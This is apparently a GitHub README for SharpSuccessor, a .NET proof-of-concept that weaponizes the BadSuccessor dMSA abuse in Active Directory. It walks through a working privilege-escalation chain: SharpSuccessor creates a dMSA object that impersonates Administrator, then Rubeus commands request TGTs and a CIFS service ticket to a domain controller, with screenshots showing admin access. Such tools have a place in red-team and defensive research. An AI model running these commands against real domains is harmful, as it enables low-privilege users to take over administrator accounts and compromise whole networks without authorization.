# SharpSuccessor

SharpSuccessor is a .NET Proof of Concept (POC) for fully weaponizing Yuval Gordon’s ([@YuG0rd](https://x.com/YuG0rd)) [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) attack from Akamai. A low privilege user with `CreateChild` permissions over any Organizational Unit (OU) in the Active Directory domain with write access on a target object can perform account takeover.

Use SharpSuccessor to add and weaponize the dMSA object, as well as write the proper attributes on the target account you wish to impersonate:
```
SharpSuccessor.exe add /impersonate:Administrator /path:"ou=test,dc=lab,dc=lan" /account:jdoe /name:attacker_dMSA
```
![image](https://github.com/user-attachments/assets/adf814ad-3a67-4862-b01e-01cf42df0747)

Request a TGT as the current user context, in this case `jdoe`:
```
Rubeus.exe tgtdeleg /nowrap
```
![image](https://github.com/user-attachments/assets/90784c3d-0961-437a-9212-51c0accacad1)


Then use that tgt to impersonate the dMSA account:
```
Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIFTDCCB.....
```
![image](https://github.com/user-attachments/assets/7f642c89-7c87-4f48-bb60-a8d9be684912)


Now you can request a service ticket with Administrator context for any SPN, including the Domain Controllers for post-exploitation. For example here I will show admin privileges for SMB on the domain controller:

```
Rubeus.exe asktgs /user:attacker_dmsa$ /service:cifs/WIN-RAEAN26UGJ5.lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIF2DCCBdS...
```
![image](https://github.com/user-attachments/assets/f4799c6d-ef21-4fbc-af2d-2fd900545937)

Now that we have the ticket in memory, we can test access:

![image](https://github.com/user-attachments/assets/6838bb98-5b7a-406a-a889-9e9236a3428f)

## Assistance and Inspirations
Massive thanks to [Jim Sykora](https://github.com/JimSycurity) and [Garrett Foster](https://x.com/unsigned_sh0rt) for the inspirations and assistance for this tool!
